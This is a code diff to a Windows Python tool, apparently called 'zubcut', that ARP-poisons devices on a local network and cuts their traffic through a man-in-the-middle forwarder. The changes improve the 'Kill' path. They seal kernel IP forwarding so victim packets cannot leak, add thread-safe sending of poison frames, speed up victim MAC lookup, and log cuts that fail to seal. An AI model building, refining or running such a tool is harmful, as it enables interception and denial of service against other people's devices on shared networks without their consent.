@@ -30,8 +30,8 @@ _forwarding_desired: bool | None = None
 _forwarding_worker: threading.Thread | None = None
 
 
-def _set_ip_enable_router_registry(want: int) -> None:
-    """Fast persistent IPEnableRouter write (no PowerShell)."""
+def _set_ip_enable_router_registry(want: int) -> bool:
+    """Fast persistent IPEnableRouter write (no PowerShell). Returns True on success."""
     try:
         import winreg
 
@@ -43,11 +43,11 @@ def _set_ip_enable_router_registry(want: int) -> None:
         )
         winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, int(want))
         winreg.CloseKey(key)
-        return
+        return True
     except Exception:
         pass
     try:
-        run_command(
+        proc = run_command(
             [
                 'reg',
                 'add',
@@ -63,8 +63,17 @@ def _set_ip_enable_router_registry(want: int) -> None:
             shell=False,
             timeout=5,
         )
+        if int(getattr(proc, 'returncode', 1) or 1) == 0:
+            return True
     except Exception:
         pass
+    try:
+        from tools.zubcut_log import app_log
+
+        app_log('ip_enable_router_write_failed', want=int(want))
+    except Exception:
+        pass
+    return False
 
 
 def _iface_indexes_from_netsh(show_out: str) -> list[str]:
@@ -91,7 +100,7 @@ def _netsh_set_iface_forwarding(iface_key: str, enabled: bool) -> bool:
         return False
     flag = 'enabled' if enabled else 'disabled'
     try:
-        run_command(
+        proc = run_command(
             [
                 'netsh',
                 'interface',
@@ -104,7 +113,8 @@ def _netsh_set_iface_forwarding(iface_key: str, enabled: bool) -> bool:
             shell=False,
             timeout=3,
         )
-        return True
+        # Non-admin netshe silently fails (access denied) — do not pretend success.
+        return int(getattr(proc, 'returncode', 1) or 1) == 0
     except Exception:
         return False
 
@@ -128,6 +138,7 @@ def _apply_windows_ip_forwarding_ifaces(
     enabled: bool,
     *,
     priority_iface: str | None = None,
+    priority_only: bool = False,
 ) -> None:
     """Per-interface runtime switch via netsh (avoid PowerShell cold-start on Kill)."""
     try:
@@ -136,12 +147,18 @@ def _apply_windows_ip_forwarding_ifaces(
             shell=False,
             timeout=6,
         )
+        show_s = str(getattr(show, 'stdout', None) or '')
     except Exception:
-        show = ''
-    show_s = str(show or '')
+        show_s = ''
     # Kill hot path: flip the active NIC first (sync caller may have done this already).
-    for key in _priority_iface_keys(priority_iface, show_s):
+    prio_keys = _priority_iface_keys(priority_iface, show_s)
+    for key in prio_keys:
         _netsh_set_iface_forwarding(key, enabled)
+    # When Clumsy/ICS SoftAP is live, only touch the priority LAN NIC — never
+    # blast-disable every adapter (that knocks hotspot clients offline). If the
+    # priority name did not resolve, skip the all-NIC path rather than falling through.
+    if priority_only:
+        return
     indexes = _iface_indexes_from_netsh(show_s)
     if not indexes:
         # Fallback once — slower, but only when netsh parse fails.
@@ -174,6 +191,7 @@ def _apply_windows_ip_forwarding_ifaces(
 
 
 _forwarding_priority_iface: str | None = None
+_forwarding_priority_only: bool = False
 
 
 def _drain_windows_ip_forwarding_applies() -> None:
@@ -183,14 +201,22 @@ def _drain_windows_ip_forwarding_applies() -> None:
         with _forwarding_lock:
             target = _forwarding_desired
             prio = _forwarding_priority_iface
+            prio_only = _forwarding_priority_only
         if target is None:
             break
         try:
-            _apply_windows_ip_forwarding_ifaces(target, priority_iface=prio)
+            _apply_windows_ip_forwarding_ifaces(
+                target, priority_iface=prio, priority_only=prio_only
+            )
         except Exception:
             pass
         with _forwarding_lock:
-            if _forwarding_desired is target:
+            # Re-loop when scope/target changed mid-apply (Clumsy on/off).
+            if (
+                _forwarding_desired is target
+                and _forwarding_priority_only is prio_only
+                and _forwarding_priority_iface == prio
+            ):
                 _forwarding_worker = None
                 return
 
@@ -200,6 +226,7 @@ def _set_windows_ip_forwarding(
     *,
     blocking: bool = False,
     priority_iface: str | None = None,
+    priority_only: bool = False,
 ) -> None:
     """Runtime + persistent IPv4 forwarding toggle (Windows).
 
@@ -209,6 +236,7 @@ def _set_windows_ip_forwarding(
     ``blocking=True`` (startup).
     """
     global _forwarding_desired, _forwarding_worker, _forwarding_priority_iface
+    global _forwarding_priority_only
     if not sys.platform.startswith('win'):
         return
     want = 1 if enabled else 0
@@ -216,19 +244,33 @@ def _set_windows_ip_forwarding(
     _set_ip_enable_router_registry(want)
     prio = str(priority_iface or '').strip() or None
 
+    # Registry alone does not change runtime forwarding. Close the cold-Kill leak
+    # window by flipping the active NIC synchronously (~tens of ms) before the
+    # background drain covers remaining adapters.
+    if not enabled and prio and not blocking:
+        try:
+            _netsh_set_iface_forwarding(prio, False)
+        except Exception:
+            pass
+
     with _forwarding_lock:
         already = _forwarding_desired is enabled
         _forwarding_desired = enabled
         if prio:
             _forwarding_priority_iface = prio
+        # Latest caller wins: Clumsy LAN Kill uses priority_only=True; a later
+        # cold-start / non-Clumsy disable must be allowed to drain all ifaces.
+        prev_prio_only = _forwarding_priority_only
+        _forwarding_priority_only = bool(priority_only)
+        scope_changed = prev_prio_only != _forwarding_priority_only
         worker_alive = _forwarding_worker is not None and _forwarding_worker.is_alive()
         if blocking:
             pass
-        elif already and not prio:
-            # Same target already requested — Kill must not wait on netsh again.
+        elif already and not prio and not scope_changed:
+            # Same target + same scope — Kill must not wait on netsh again.
             return
         elif worker_alive:
-            # Worker will re-read `_forwarding_desired` / priority iface.
+            # Worker will re-read `_forwarding_desired` / priority iface / scope.
             return
         else:
             thr = threading.Thread(
@@ -242,6 +284,64 @@ def _set_windows_ip_forwarding(
 
     # blocking path (startup clean): apply now on this thread.
     _drain_windows_ip_forwarding_applies()
+
+
+def _iface_forwarding_enabled_netsh(iface_key: str) -> bool | None:
+    """True/False when ``netsh … show interface <key>`` reports Forwarding; None if unknown."""
+    key = str(iface_key or '').strip()
+    if not key:
+        return None
+    try:
+        out = run_command(
+            ['netsh', 'interface', 'ipv4', 'show', 'interface', key],
+            shell=False,
+            timeout=1,
+        )
+        text = str(getattr(out, 'stdout', None) or '')
+    except Exception:
+        return None
+    # EN Forwarding / DE Weiterleitung / FR Réacheminement / ES Reenvío …
+    key_hints = (
+        'forward',
+        'weiterleit',
+        'reachemin',
+        'réachemin',
+        'reenv',
+        'inoltr',
+    )
+    on_vals = (
+        'enabled',
+        'aktiviert',
+        'activé',
+        'active',
+        'activado',
+        'attivo',
+        'ein',
+    )
+    off_vals = (
+        'disabled',
+        'deaktiviert',
+        'désactivé',
+        'desactive',
+        'desactivado',
+        'disattivato',
+        'aus',
+    )
+    for raw in text.splitlines():
+        line = raw.strip()
+        if ':' not in line:
+            continue
+        label, val = line.split(':', 1)
+        label_l = label.strip().lower()
+        val_l = val.strip().lower()
+        if not any(h in label_l for h in key_hints):
+            continue
+        # Prefer exact token match so "disabled" is not read as "enabled".
+        if val_l in on_vals:
+            return True
+        if val_l in off_vals:
+            return False
+    return None
 
 
 def is_ip_forwarding_enabled() -> bool:
@@ -263,35 +363,70 @@ def is_ip_forwarding_enabled() -> bool:
             return True
     except Exception:
         pass
+    # Plural ``show interfaces`` has no Forwarding column — probe singular per Idx.
+    # Cap probes: common case is registry=0 and all ifaces disabled; keep this fast.
     try:
-        out = run_command(
+        listing = run_command(
             ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
             shell=False,
-            timeout=6,
+            timeout=4,
         )
-        text = str(out or '').lower()
-        # Per-iface lines include a Forwarding column when queried individually;
-        # show interfaces listing is enough for a coarse hint when registry is 0.
-        if 'forwarding' in text and 'enabled' in text:
-            return True
+        show_s = str(getattr(listing, 'stdout', None) or '')
+        # Probe enough adapters for multi-NIC / VPN / SoftAP PCs without
+        # spending many seconds on singular netsh calls (post-arm warn only).
+        for idx in _iface_indexes_from_netsh(show_s)[:8]:
+            state = _iface_forwarding_enabled_netsh(idx)
+            if state is True:
+                return True
     except Exception:
         pass
     return False
 
 
-def enable_ip_forwarding(*, blocking: bool = False, priority_iface: str | None = None):
+def enable_ip_forwarding(
+    *,
+    blocking: bool = False,
+    priority_iface: str | None = None,
+    priority_only: bool = False,
+):
     """Enable kernel IP forwarding (Windows: IPEnableRouter + per-iface netsh)."""
-    _set_windows_ip_forwarding(True, blocking=blocking, priority_iface=priority_iface)
+    _set_windows_ip_forwarding(
+        True,
+        blocking=blocking,
+        priority_iface=priority_iface,
+        priority_only=priority_only,
+    )
 
 
-def disable_ip_forwarding(*, blocking: bool = False, priority_iface: str | None = None):
+def disable_ip_forwarding(
+    *,
+    blocking: bool = False,
+    priority_iface: str | None = None,
+    priority_only: bool = False,
+):
     """Disable kernel IP forwarding so MITM forwarder is the only relay path.
 
     Non-blocking by default (registry sync + background netsh). Call **after**
     instant poison/cut on Kill — never before. Startup may pass ``blocking=True``.
     ``priority_iface`` (e.g. ``Wi-Fi``) is applied first in the background worker.
+    ``priority_only=True`` skips other NICs (keeps Clumsy/ICS SoftAP forwarding).
     """
-    _set_windows_ip_forwarding(False, blocking=blocking, priority_iface=priority_iface)
+    _set_windows_ip_forwarding(
+        False,
+        blocking=blocking,
+        priority_iface=priority_iface,
+        priority_only=priority_only,
+    )
+
+
+def _lan_kill_priority_only() -> bool:
+    """True when Clumsy SoftAP may need other-NIC forwarding left alone."""
+    try:
+        from tools.clumsy_inline import clumsy_mode_enabled
+
+        return bool(clumsy_mode_enabled())
+    except Exception:
+        return False
 
 
 class Killer:
@@ -309,6 +444,8 @@ class Killer:
         self.pf_blocks = set()
         self._socket = None  # Persistent L2 socket
         self._socket_token: str | None = None  # Npcap bind token that opened _socket
+        # Npcap/Scapy L2socket is not safe for concurrent send from Kill GUI + ARP worker.
+        self._socket_lock = threading.RLock()
         self._op_seq = {}  # MAC -> operation generation to cancel stale workers
 
     def _next_op_seq(self, mac):
@@ -365,31 +502,33 @@ class Killer:
 
     def _get_socket(self):
         """Get or create persistent L2 socket — tries all Npcap bind tokens (GUID + name)."""
-        if self.l2_socket_ready():
-            return self._socket
-        self._socket = None
-        self._socket_token = None
-        for tok in self._iface_l2_tokens():
-            try:
-                self._socket = conf.L2socket(iface=tok)
-                self._socket_token = tok
-                try:
-                    conf.iface = tok
-                except Exception:
-                    pass
+        with self._socket_lock:
+            if self.l2_socket_ready():
                 return self._socket
-            except Exception:
-                self._socket = None
-                self._socket_token = None
-                continue
-        return None
+            self._socket = None
+            self._socket_token = None
+            for tok in self._iface_l2_tokens():
+                try:
+                    self._socket = conf.L2socket(iface=tok)
+                    self._socket_token = tok
+                    try:
+                        conf.iface = tok
+                    except Exception:
+                        pass
+                    return self._socket
+                except Exception:
+                    self._socket = None
+                    self._socket_token = None
+                    continue
+            return None
     
     def _send_packet(self, packet):
         """Send packet using persistent socket, fallback to new socket if needed"""
         sock = self._get_socket()
         if sock:
             try:
-                sock.send(packet)
+                with self._socket_lock:
+                    sock.send(packet)
                 return
             except Exception:
                 # Socket died, recreate
@@ -410,13 +549,14 @@ class Killer:
     
     def _close_socket(self):
         """Close persistent socket"""
-        if self._socket:
-            try:
-                self._socket.close()
-            except Exception:
-                pass
-            self._socket = None
-        self._socket_token = None
+        with self._socket_lock:
+            if self._socket:
+                try:
+                    self._socket.close()
+                except Exception:
+                    pass
+                self._socket = None
+            self._socket_token = None
 
     def _sync_iface_for_victim(self, victim, *, refresh_router=True):
         """
@@ -452,7 +592,8 @@ class Killer:
         if not refresh_router:
             return
         router_ip = get_gateway_ip(guid)
-        router_mac = get_gateway_mac(iface_ip, router_ip)
+        # ARP-only first — Scapy getmacbyip can stall Kill ON ~4s on cold/wedged Npcap.
+        router_mac = get_gateway_mac(iface_ip, router_ip, allow_scapy_probe=False)
         if (
             sys.platform.startswith('win')
             and router_ip
@@ -466,7 +607,9 @@ class Killer:
                 )
             except Exception:
                 pass
-            router_mac = get_gateway_mac(iface_ip, router_ip)
+            router_mac = get_gateway_mac(iface_ip, router_ip, allow_scapy_probe=False)
+        # Do not Scapy-probe here — this runs on the Kill click thread; GLOBAL_MAC
+        # is handled by mitm_prereqs / background warm if still unknown.
         self.router = {
             'ip': router_ip,
             'mac': router_mac,
@@ -495,8 +638,8 @@ class Killer:
             mac = lookup_mac_from_arp_table(router_ip, iface_ip)
         if not mac_address_is_usable(mac):
             try:
-                guid = getattr(self.iface, 'guid', None) or self.iface.name
-                mac = get_gateway_mac(iface_ip, router_ip)
+                # Click-path helper — never fall through to getmacbyip (~4s).
+                mac = get_gateway_mac(iface_ip, router_ip, allow_scapy_probe=False)
             except Exception:
                 mac = GLOBAL_MAC
         if mac_address_is_usable(mac) and isinstance(self.router, dict):
@@ -523,20 +666,35 @@ class Killer:
         except Exception:
             iface_guid = ''
         victim_ip = str(victim.get('ip') or '').strip()
-        if victim_ip:
+        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
+        cache_mac = (
+            lookup_mac_from_arp_table(victim_ip, iface_ip) if victim_ip else ''
+        )
+        recent_probe_mac = ''
+        # Scapy arping can cost ~2s per iface token — skip when OS ARP already has the IP.
+        # Device-table MAC alone is not enough: PS5 often has a scan MAC while ARP is cold.
+        if victim_ip and not mac_address_is_usable(cache_mac):
             probed = _lan_neighbor_mac_via_arp_probe(
                 victim_ip, iface_guid, iface=self.iface
             )
             if mac_address_is_usable(probed):
                 victim['mac'] = probed
+                cache_mac = probed
+                recent_probe_mac = probed
+        elif mac_address_is_usable(cache_mac):
+            victim['mac'] = cache_mac
         if not mac_address_is_usable(victim.get('mac')):
             return False, 'victim MAC unknown (ping PS5, rescan)'
         live_ok, live_reason = victim_endpoint_live_for_mitm(
             victim.get('ip'),
             victim.get('mac'),
-            getattr(self.iface, 'ip', None),
+            iface_ip or None,
             ping_attempts=max(1, int(ping_attempts)),
-            arp_probe_iface=iface_guid or None,
+            # Already probed above when cache was cold — do not pay a second arping.
+            # Pass the probed MAC so liveness still succeeds when ICMP is blocked and
+            # the OS ARP cache has not absorbed the who-has reply yet.
+            arp_probe_iface=None,
+            recent_arp_mac=recent_probe_mac or None,
         )
         if not live_ok:
             return False, live_reason
@@ -600,7 +758,11 @@ class Killer:
             self._apply_traffic_cut_sync(victim)
         if not ics_mode:
             # After cut is armed — seal kernel relay without delaying the first hit.
-            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+            # With Clumsy/hotspot SoftAP live, only flip the LAN NIC so ICS keeps working.
+            disable_ip_forwarding(
+                priority_iface=getattr(self.iface, 'name', None),
+                priority_only=_lan_kill_priority_only(),
+            )
         if not ics_mode and traffic_cut:
             # Background only: reseal poison/cut/forwarding without delaying the click.
             self._reinforce_full_cut_async(victim)
@@ -614,8 +776,28 @@ class Killer:
             return False
         # Hot path: GUI already validated live MITM; do not re-ping here.
         if not mac_address_is_usable((self.router or {}).get('mac')):
+            try:
+                from tools.zubcut_log import app_log
+
+                app_log(
+                    'traffic_cut_skipped',
+                    reason='router_mac',
+                    ip=str(victim.get('ip') or ''),
+                )
+            except Exception:
+                pass
             return False
         if not mac_address_is_usable(victim.get('mac')):
+            try:
+                from tools.zubcut_log import app_log
+
+                app_log(
+                    'traffic_cut_skipped',
+                    reason='victim_mac',
+                    ip=str(victim.get('ip') or ''),
+                )
+            except Exception:
+                pass
             return False
         self.apply_percent_cut(victim, pass_percent=0)
         fw = self.forwarders.get(mac)
@@ -673,6 +855,7 @@ class Killer:
         if not mac or mac not in self.killed:
             return
         rounds = max(1, min(8, int(rounds)))
+        sealed = False
         for i in range(rounds):
             if mac not in self.killed:
                 return
@@ -680,10 +863,27 @@ class Killer:
             if not self._seal_hard_drop(mac):
                 # Forwarder missing/dead — retry full cut (still post-instant).
                 self._apply_traffic_cut_sync(victim)
-                self._seal_hard_drop(mac)
-            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+                sealed = self._seal_hard_drop(mac)
+            else:
+                sealed = True
+            disable_ip_forwarding(
+                priority_iface=getattr(self.iface, 'name', None),
+                priority_only=_lan_kill_priority_only(),
+            )
             if i + 1 < rounds:
                 sleep(0.05 + (0.05 * i))
+        if not sealed:
+            try:
+                from tools.zubcut_log import app_log
+
+                app_log(
+                    'kill_reinforce_unsealed',
+                    mac=str(mac),
+                    ip=str(victim.get('ip') or ''),
+                    rounds=rounds,
+                )
+            except Exception:
+                pass
 
     def _reinforce_full_cut_async(self, victim) -> None:
         """Schedule ``reinforce_full_cut`` off the Kill click / GUI thread."""
@@ -706,7 +906,17 @@ class Killer:
                 live = self.killed.get(snap['mac']) or snap
                 self.reinforce_full_cut(live if isinstance(live, dict) else snap)
             except Exception:
-                pass
+                try:
+                    from tools.zubcut_log import app_log
+
+                    app_log(
+                        'kill_reinforce_failed',
+                        mac=str(snap.get('mac') or ''),
+                        ip=str(snap.get('ip') or ''),
+                        exc_info=True,
+                    )
+                except Exception:
+                    pass
 
         try:
             threading.Thread(
@@ -796,11 +1006,13 @@ class Killer:
             if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                 break
             try:
-                for frame in frames:
-                    sock.send(frame)
+                with self._socket_lock:
+                    for frame in frames:
+                        sock.send(frame)
             except Exception:
                 # Socket died mid-burst — let the threaded worker recover.
-                self._socket = None
+                with self._socket_lock:
+                    self._socket = None
                 return
             if delay_s > 0:
                 sleep(delay_s)
@@ -887,7 +1099,10 @@ class Killer:
             self.forwarders.pop(mac, None)
             return False
         # Seal kernel relay after the forwarder is live — never before the cut.
-        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+        disable_ip_forwarding(
+            priority_iface=getattr(self.iface, 'name', None),
+            priority_only=_lan_kill_priority_only(),
+        )
         return True
 
     def disable_percent_cut(self, mac):
@@ -969,7 +1184,10 @@ class Killer:
             iface_alts=tokens[1:],
         )
         self.forwarders[victim['mac']] = fw
-        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+        disable_ip_forwarding(
+            priority_iface=getattr(self.iface, 'name', None),
+            priority_only=_lan_kill_priority_only(),
+        )
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0, *, aggressive=False):
@@ -1246,8 +1464,15 @@ class Killer:
         if fw:
             fw.stop()
         # Keep kernel forwarding OFF when idle so the next Kill cannot leak through
-        # a failed disable. Clumsy/ICS turns forwarding on when that path needs it.
+        # a failed disable. Never yank forwarding under Clumsy/ICS hotspot sharing.
         if not self.forwarders and not self.killed:
+            try:
+                from tools.clumsy_inline import clumsy_mode_enabled
+
+                if clumsy_mode_enabled():
+                    return
+            except Exception:
+                pass
             disable_ip_forwarding()
 
     def _enforce_pf_block(self, victim_ip: str):
